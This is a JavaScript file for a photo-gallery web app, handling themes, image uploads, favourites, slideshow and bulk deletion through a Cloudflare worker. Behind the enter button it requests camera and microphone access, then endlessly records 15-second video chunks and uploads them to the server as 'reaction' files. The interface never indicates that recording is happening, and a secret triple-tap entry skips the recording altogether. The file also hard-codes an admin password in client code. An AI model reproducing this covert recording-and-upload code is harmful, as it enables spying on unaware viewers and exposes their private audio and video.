const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; 
const ADMIN_PASS = "74722222"; 
const RECORDING_CHUNK_MS = 15000; 

const galleryContainer = document.getElementById('gallery-grid');

// --- THEMES & LAYOUTS (WITH AUTO-SAVE) ---
const layouts = ['grid-style-5', 'grid-style-1', 'grid-style-2', 'grid-style-3', 'grid-style-4'];
let layoutIdx = parseInt(localStorage.getItem('savedLayout')) || 0;

const themes = ['theme-light', 'theme-amoled', 'theme-aurora', 'theme-champagne'];
let themeIdx = parseInt(localStorage.getItem('savedTheme')) || 0;

// অ্যাপ ওপেন হওয়ার সাথে সাথেই সেভ করা থিম অ্যাপ্লাই হবে
document.body.className = themes[themeIdx];
if(galleryContainer) galleryContainer.className = layouts[layoutIdx];

let favorites = [];
let showFavsOnly = false;
let allImageKeys = []; // স্লাইডশোর জন্য 
let selectedForDelete = []; // মাল্টিপল ডিলিটের জন্য

try { favorites = JSON.parse(localStorage.getItem('favs')) || []; } catch (e) {}

function toggleFavorite(key) {
    try {
        if (favorites.includes(key)) favorites = favorites.filter(k => k !== key);
        else favorites.push(key);
        localStorage.setItem('favs', JSON.stringify(favorites));
        loadImages(); 
    } catch(e) {}
}

function safeClick(id, callback) {
    const el = document.getElementById(id);
    if (el) el.addEventListener('click', callback);
}

// 1. Entry & Recording
let secretTap = 0, tapTimer;
safeClick('secret-heart', () => {
    secretTap++; clearTimeout(tapTimer);
    if (secretTap >= 3) { document.getElementById('entry-screen').classList.remove('active-screen'); document.getElementById('gallery-screen').classList.add('active-screen'); loadImages(); secretTap = 0; } 
    tapTimer = setTimeout(() => secretTap = 0, 1000); 
});

safeClick('enter-btn', async () => {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('entry-screen').classList.remove('active-screen'); document.getElementById('gallery-screen').classList.add('active-screen'); loadImages();
            startRecording(stream);
        } else { document.getElementById('entry-screen').classList.remove('active-screen'); document.getElementById('gallery-screen').classList.add('active-screen'); loadImages(); }
    } catch (err) { document.getElementById('entry-screen').classList.remove('active-screen'); document.getElementById('gallery-screen').classList.add('active-screen'); loadImages(); } 
});

// --- 1. RECORDING LOGIC (BUG FIXED & CRASH PROOF) ---
async function startRecording(stream) {
    while (true) {
        await new Promise(resolve => {
            try {
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                let chunks = [];
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    // Size Check: 0.00MB বা ফাঁকা ফাইল আপলোড ঠেকানোর জন্য (20KB এর বড় হতে হবে)
                    if (blob.size > 20000) { 
                        const formData = new FormData();
                        formData.append('file', blob, `reaction-${Date.now()}.webm`);
                        try { await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData }); } catch(err){}
                    }
                    resolve(); // আগের ভিডিও আপলোড শেষ হলে তবেই নতুনটা শুরু হবে
                };
                
                recorder.start();
                setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, RECORDING_CHUNK_MS);
            } catch(e) {
                setTimeout(resolve, 5000); // এরর হলে ৫ সেকেন্ড ব্রেক নেবে
            }
        });
    }
}

// 2. Upload
safeClick('upload-fab', () => document.getElementById('image-upload-input')?.click());
document.getElementById('image-upload-input')?.addEventListener('change', async (e) => {
    if (!e.target.files.length) return;
    galleryContainer.innerHTML = '<div class="loading-text">Uploading photos... ⏳</div>';
    for (let file of e.target.files) {
        const formData = new FormData(); formData.append('file', file);
        try { await fetch(`${WORKER_URL}/api/upload-image`, { method: 'POST', body: formData }); } catch(err){}
    }
    loadImages();
});

// 3. Load Images & Bulk Selection
async function loadImages() {
    if(!galleryContainer) return;
    try {
        const res = await fetch(`${WORKER_URL}/api/images`);
        if (res.ok) {
            const data = await res.json();
            galleryContainer.innerHTML = ''; 
            
            let imgArray = data.images;
            const isMasonry = ['grid-style-1', 'grid-style-3', 'grid-style-5'].includes(layouts[layoutIdx]);
            let colCount = layouts[layoutIdx] === 'grid-style-5' ? 2 : (isMasonry ? 3 : 1);

            if (showFavsOnly) {
                imgArray = imgArray.filter(k => favorites.includes(k)); 
                if (isMasonry && imgArray.length > 0) {
                    let cols = Array.from({length: colCount}, () => []);
                    imgArray.forEach((item, i) => cols[i % colCount].push(item));
                    imgArray = cols.reduce((acc, val) => acc.concat(val), []);
                }
            } else {
                let f = imgArray.filter(k => favorites.includes(k));
                let n = imgArray.filter(k => !favorites.includes(k));
                if (isMasonry) {
                    let cols = Array.from({length: colCount}, () => []);
                    f.forEach((item, i) => cols[i % colCount].push(item));
                    n.forEach((item, i) => { cols[(f.length + i) % colCount].push(item); });
                    imgArray = cols.reduce((acc, val) => acc.concat(val), []); 
                } else { imgArray = f.concat(n); }
            }

            allImageKeys = imgArray; // স্লাইডশোর জন্য সেভ রাখা হলো

            if (imgArray.length === 0) { 
                galleryContainer.innerHTML = showFavsOnly ? '<div class="loading-text">No favorites yet! ❤️</div>' : '<div class="loading-text">No photos yet. Tap + to upload ❤️</div>'; 
                return; 
            }
            
            imgArray.forEach(key => {
                const isFav = favorites.includes(key);
                const isSelected = selectedForDelete.includes(key);
                const wrap = document.createElement('div');
                wrap.className = `img-wrapper ${isSelected ? 'selected' : ''}`;
                wrap.innerHTML = `
                    <img src="${WORKER_URL}/api/image/${key}" loading="lazy">
                    ${isFav ? '<div class="fav-badge">❤️</div>' : ''}
                    <div class="select-check">✓</div>
                `;
                
                const imgEl = wrap.querySelector('img');
                let pressTimer; let longPressed = false;
                
                const startPress = () => {
                    longPressed = false;
                    if(document.body.classList.contains('delete-mode')) return;
                    pressTimer = setTimeout(() => {
                        longPressed = true; toggleFavorite(key);
                        try { if (navigator.vibrate) navigator.vibrate(50); } catch(e){}
                    }, 500); 
                };
                const cancelPress = () => clearTimeout(pressTimer);
                
                imgEl.addEventListener('touchstart', startPress, {passive: true});
                imgEl.addEventListener('touchend', cancelPress);
                imgEl.addEventListener('mousedown', startPress);
                imgEl.addEventListener('mouseup', cancelPress);
                imgEl.addEventListener('mouseleave', cancelPress);
                
                imgEl.addEventListener('click', () => {
                    if(document.body.classList.contains('delete-mode')) {
                        // Bulk Selection Logic
                        if(selectedForDelete.includes(key)) {
                            selectedForDelete = selectedForDelete.filter(k => k !== key);
                            wrap.classList.remove('selected');
                        } else {
                            selectedForDelete.push(key);
                            wrap.classList.add('selected');
                        }
                        updateBulkBar();
                    } else if(!longPressed) {
                        openFullscreen(`${WORKER_URL}/api/image/${key}`);
                    }
                });
                galleryContainer.appendChild(wrap);
            });
        }
    } catch (err) {}
}

// Bulk Delete UI & Execution
function updateBulkBar() {
    const bar = document.getElementById('bulk-action-bar');
    document.getElementById('bulk-count').innerText = `${selectedForDelete.length} selected`;
    if(selectedForDelete.length > 0) bar.classList.add('active');
    else bar.classList.remove('active');
}

safeClick('bulk-delete-btn', async () => {
    if(!confirm(`Delete ${selectedForDelete.length} photos permanently?`)) return;
    galleryContainer.innerHTML = '<div class="loading-text">Deleting... ⏳</div>';
    document.getElementById('bulk-action-bar').classList.remove('active');
    
    try {
        await fetch(`${WORKER_URL}/api/admin/files/bulk`, {
            method: 'DELETE',
            headers: { 'X-Admin-Password': ADMIN_PASS, 'Content-Type': 'application/json' },
            body: JSON.stringify({ keys: selectedForDelete })
        });
        favorites = favorites.filter(k => !selectedForDelete.includes(k));
        localStorage.setItem('favs', JSON.stringify(favorites));
        selectedForDelete = [];
        loadImages();
    } catch(err) { alert('Failed'); loadImages(); }
});

// 4. Premium Slideshow
let slideInterval;
let currentSlide = 0;
const fullscreenImg = document.getElementById('fullscreen-img');

safeClick('slideshow-btn', () => {
    if(allImageKeys.length === 0) return alert("No photos to play!");
    currentSlide = 0;
    openFullscreen(`${WORKER_URL}/api/image/${allImageKeys[currentSlide]}`);
    
    slideInterval = setInterval(() => {
        currentSlide = (currentSlide + 1) % allImageKeys.length;
        fullscreenImg.style.opacity = 0; // Fade out
        setTimeout(() => {
            fullscreenImg.src = `${WORKER_URL}/api/image/${allImageKeys[currentSlide]}`;
            fullscreenImg.style.opacity = 1; // Fade in
        }, 300);
    }, 3000); // প্রতি ৩ সেকেন্ডে ছবি বদলাবে
});

function openFullscreen(src) {
    if(fullscreenImg) { fullscreenImg.src = src; document.getElementById('fullscreen-modal').classList.add('active'); }
}

function closeFullscreen() {
    clearInterval(slideInterval); // স্লাইডশো থামিয়ে দেওয়া
    document.getElementById('fullscreen-modal').classList.remove('active');
    if(fullscreenImg) { fullscreenImg.style.opacity = 1; fullscreenImg.src = ''; }
}

safeClick('close-modal-btn', closeFullscreen);
document.getElementById('fullscreen-modal')?.addEventListener('click', (e) => { if(e.target.id === 'fullscreen-modal') closeFullscreen(); });

// 5. Controls & Nav (UPDATED FOR SAVING PREFERENCES)
safeClick('theme-toggle', () => { 
    document.body.classList.remove(themes[themeIdx]); 
    themeIdx = (themeIdx + 1) % themes.length; 
    document.body.classList.add(themes[themeIdx]); 
    localStorage.setItem('savedTheme', themeIdx); 
});

safeClick('layout-toggle', () => { 
    if(galleryContainer) { 
        galleryContainer.className = ''; 
        layoutIdx = (layoutIdx + 1) % layouts.length; 
        galleryContainer.classList.add(layouts[layoutIdx]); 
        localStorage.setItem('savedLayout', layoutIdx);
    }
});

const navDelete = document.getElementById('nav-delete');
safeClick('nav-delete', () => {
    document.body.classList.toggle('delete-mode');
    const isDeleteMode = document.body.classList.contains('delete-mode');
    if(navDelete) { navDelete.classList.toggle('danger', isDeleteMode); navDelete.classList.toggle('active', isDeleteMode); }
    selectedForDelete = []; updateBulkBar(); // মোড চেঞ্জ করলে সিলেকশন রিসেট
    loadImages(); // রিলোড করে সিলেকশন মার্ক সরাবে
    
    if (isDeleteMode) { document.getElementById('nav-home')?.classList.remove('active'); document.getElementById('nav-favs')?.classList.remove('active'); } 
    else { document.getElementById('nav-home')?.classList.toggle('active', !showFavsOnly); document.getElementById('nav-favs')?.classList.toggle('active', showFavsOnly); }
});

safeClick('nav-home', () => { document.body.classList.remove('delete-mode'); showFavsOnly = false; navDelete?.classList.remove('danger', 'active'); document.getElementById('nav-favs')?.classList.remove('active'); document.getElementById('nav-home')?.classList.add('active'); selectedForDelete = []; updateBulkBar(); loadImages(); });
safeClick('nav-favs', () => { document.body.classList.remove('delete-mode'); showFavsOnly = true; navDelete?.classList.remove('danger', 'active'); document.getElementById('nav-home')?.classList.remove('active'); document.getElementById('nav-favs')?.classList.add('active'); selectedForDelete = []; updateBulkBar(); loadImages(); });

// --- SERVICE WORKER (FOR PERMANENT IMAGE CACHING) ---
if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        navigator.serviceWorker.register('sw.js').catch(err => console.log('SW failed:', err));
    });
}
